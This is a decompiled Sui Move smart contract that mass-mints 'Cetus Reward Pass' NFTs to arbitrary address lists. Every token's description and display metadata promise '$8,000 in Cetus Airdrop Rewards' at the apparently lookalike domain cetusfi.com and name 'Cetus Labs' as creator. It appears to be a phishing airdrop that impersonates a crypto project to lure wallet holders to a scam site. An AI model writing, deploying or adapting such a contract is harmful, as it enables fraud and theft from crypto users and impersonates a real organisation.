module 0xc15a40beac0096045c3b1d4f36f0f809493274b6ea0b150d7f5159515c9ddf67::CETUS_AIRDROP_W {
    struct CETUS_AIRDROP_W has drop {
        dummy_field: bool,
    }

    struct CETUS_AIRDROP_PASS has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = CETUS_AIRDROP_PASS{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Cetus Reward Pass"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/cetus/cetus_item.jpg"),
                description : 0x1::string::utf8(b"Your Airdrop Reward is ready at https://cetusfi.com. Unlock $8,000 in Cetus Airdrop Rewards."),
                Reward      : 0x1::string::utf8(b"$8,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<CETUS_AIRDROP_PASS>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Cetus Reward Pass"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/cetus/cetus_item.jpg"),
                description : 0x1::string::utf8(b"Your Airdrop Reward is ready at https://cetusfi.com. Unlock $8,000 in Cetus Airdrop Rewards."),
                Reward      : 0x1::string::utf8(b"$8,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<CETUS_AIRDROP_PASS>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: CETUS_AIRDROP_PASS, arg1: &mut 0x2::tx_context::TxContext) {
        let CETUS_AIRDROP_PASS {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: CETUS_AIRDROP_W, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Cetus Reward Pass"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/cetus/cetus_item.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Your Airdrop Reward is ready at https://cetusfi.com. Unlock $8,000 in Cetus Airdrop Rewards."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://cetusfi.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Cetus Labs"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$8,000"));
        let v4 = 0x2::package::claim<CETUS_AIRDROP_W>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<CETUS_AIRDROP_PASS>(&v4, v0, v2, arg1);
        0x2::display::update_version<CETUS_AIRDROP_PASS>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<CETUS_AIRDROP_PASS>>(v5, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_nft(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = CETUS_AIRDROP_PASS{
            id          : 0x2::object::new(arg0),
            name        : 0x1::string::utf8(b"Cetus Reward Pass"),
            image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/cetus/cetus_item.jpg"),
            description : 0x1::string::utf8(b"Your Airdrop Reward is ready at https://cetusfi.com. Unlock $8,000 in Cetus Airdrop Rewards."),
            Reward      : 0x1::string::utf8(b"$8,000"),
        };
        let v1 = MintEvent{
            nft_id      : 0x2::object::id<CETUS_AIRDROP_PASS>(&v0),
            user        : 0x2::tx_context::sender(arg0),
            name        : 0x1::string::utf8(b"Cetus Reward Pass"),
            image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/cetus/cetus_item.jpg"),
            description : 0x1::string::utf8(b"Your Airdrop Reward is ready at https://cetusfi.com. Unlock $8,000 in Cetus Airdrop Rewards."),
            Reward      : 0x1::string::utf8(b"$8,000"),
        };
        0x2::event::emit<MintEvent>(v1);
        0x2::transfer::public_transfer<CETUS_AIRDROP_PASS>(v0, 0x2::tx_context::sender(arg0));
    }

    // decompiled from Move bytecode v6
}

